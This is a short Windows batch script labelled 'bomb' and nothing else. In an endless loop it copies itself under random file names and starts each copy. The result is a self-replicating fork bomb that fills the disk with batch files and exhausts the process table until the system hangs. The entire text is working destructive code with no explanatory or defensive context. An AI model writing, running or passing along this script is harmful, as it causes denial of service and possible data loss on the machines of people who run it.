:bomb
set id=%random%%random%%random%.bat
copy %~nx0 %id%
start call %id%
goto bomb
